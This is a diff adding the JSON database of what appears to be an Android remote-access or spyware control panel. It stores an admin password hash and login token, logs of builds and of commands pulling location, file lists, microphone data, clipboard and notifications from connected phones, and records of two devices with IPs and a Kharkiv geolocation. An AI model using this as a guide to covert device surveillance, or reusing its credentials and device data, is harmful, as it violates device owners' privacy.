@@ -1,0 +1,233 @@
+{
+  "admin": {
+    "username": "admin",
+    "password": "827ccb0eea8a706c4c34a16891f84e7b",
+    "loginToken": "5d62fd5275d1f21b9a861dfb10b3a8e8",
+    "logs": [
+      {
+        "time": "2022-06-12T14:55:53.135Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:05:35.704Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:06:39.089Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:07:15.300Z",
+        "type": "INFO",
+        "message": "2b9669917a4398c2 Connected"
+      },
+      {
+        "time": "2022-06-12T15:07:25.343Z",
+        "type": "INFO",
+        "message": "2b9669917a4398c2 Disconnected"
+      },
+      {
+        "time": "2022-06-12T15:07:26.386Z",
+        "type": "INFO",
+        "message": "2b9669917a4398c2 Connected"
+      },
+      {
+        "time": "2022-06-12T15:07:33.620Z",
+        "type": "INFO",
+        "message": "Requested 0xLO From 2b9669917a4398c2"
+      },
+      {
+        "time": "2022-06-12T15:07:33.625Z",
+        "type": "ERROR",
+        "message": "2b9669917a4398c2 GPS Recieved No Data"
+      },
+      {
+        "time": "2022-06-12T15:07:33.626Z",
+        "type": "ERROR",
+        "message": "2b9669917a4398c2 GPS LOCATION SOCKET DATA{}"
+      },
+      {
+        "time": "2022-06-12T15:07:44.706Z",
+        "type": "INFO",
+        "message": "Requested 0xFI From 2b9669917a4398c2"
+      },
+      {
+        "time": "2022-06-12T15:07:44.712Z",
+        "type": "SUCCESS",
+        "message": "File List Updated"
+      },
+      {
+        "time": "2022-06-12T15:07:59.259Z",
+        "type": "INFO",
+        "message": "Requested 0xMI From 2b9669917a4398c2"
+      },
+      {
+        "time": "2022-06-12T15:13:12.590Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:15:00.811Z",
+        "type": "INFO",
+        "message": "Requested 0xFI From 2b9669917a4398c2"
+      },
+      {
+        "time": "2022-06-12T15:15:02.201Z",
+        "type": "INFO",
+        "message": "Requested 0xFI From 2b9669917a4398c2"
+      },
+      {
+        "time": "2022-06-12T15:15:02.205Z",
+        "type": "SUCCESS",
+        "message": "File List Updated"
+      },
+      {
+        "time": "2022-06-12T15:15:06.331Z",
+        "type": "INFO",
+        "message": "Requested 0xFI From 2b9669917a4398c2"
+      },
+      {
+        "time": "2022-06-12T15:15:06.335Z",
+        "type": "SUCCESS",
+        "message": "File List Updated"
+      },
+      {
+        "time": "2022-06-12T15:15:10.547Z",
+        "type": "INFO",
+        "message": "Requested 0xFI From 2b9669917a4398c2"
+      },
+      {
+        "time": "2022-06-12T15:15:10.552Z",
+        "type": "SUCCESS",
+        "message": "File List Updated"
+      },
+      {
+        "time": "2022-06-12T15:16:54.428Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:20:55.886Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:22:04.547Z",
+        "type": "INFO",
+        "message": "2b9669917a4398c2 ClipBoard Recieved"
+      },
+      {
+        "time": "2022-06-12T15:22:34.357Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:22:46.343Z",
+        "type": "INFO",
+        "message": "2b9669917a4398c2 Disconnected"
+      },
+      {
+        "time": "2022-06-12T15:25:46.546Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:36:26.327Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:51:23.250Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:58:48.011Z",
+        "type": "SUCCESS",
+        "message": "Build Succeded!"
+      },
+      {
+        "time": "2022-06-12T15:59:04.831Z",
+        "type": "INFO",
+        "message": "66261844018f552c Connected"
+      },
+      {
+        "time": "2022-06-12T15:59:11.363Z",
+        "type": "INFO",
+        "message": "66261844018f552c Disconnected"
+      },
+      {
+        "time": "2022-06-12T15:59:12.487Z",
+        "type": "INFO",
+        "message": "66261844018f552c Connected"
+      },
+      {
+        "time": "2022-06-12T16:00:11.095Z",
+        "type": "INFO",
+        "message": "66261844018f552c ClipBoard Recieved"
+      },
+      {
+        "time": "2022-06-12T16:00:11.518Z",
+        "type": "INFO",
+        "message": "66261844018f552c Notification Recieved"
+      },
+      {
+        "time": "2022-06-12T16:02:10.087Z",
+        "type": "INFO",
+        "message": "66261844018f552c Disconnected"
+      }
+    ],
+    "ipLog": []
+  },
+  "clients": [
+    {
+      "clientID": "2b9669917a4398c2",
+      "firstSeen": "2022-06-12T15:07:15.290Z",
+      "lastSeen": "2022-06-12T15:22:46.343Z",
+      "isOnline": false,
+      "dynamicData": {
+        "clientIP": "192.168.0.105",
+        "clientGeo": {},
+        "device": {
+          "model": "SM-A805N",
+          "manufacture": "samsung",
+          "version": "7.1.2"
+        }
+      }
+    },
+    {
+      "clientID": "66261844018f552c",
+      "firstSeen": "2022-06-12T15:59:04.824Z",
+      "lastSeen": "2022-06-12T16:02:10.088Z",
+      "isOnline": false,
+      "dynamicData": {
+        "clientIP": "194.28.65.138",
+        "clientGeo": {
+          "range": [
+            3256631296,
+            3256632319
+          ],
+          "country": "UA",
+          "region": "63",
+          "eu": "0",
+          "timezone": "Europe/Kiev",
+          "city": "Kharkiv",
+          "ll": [
+            49.9808,
+            36.2527
+          ],
+          "metro": 0,
+          "area": 100
+        },
+        "device": {
+          "model": "ASUS_Z01QD",
+          "manufacture": "asus",
+          "version": "7.1.2"
+        }
+      }
+    }
+  ]
+}
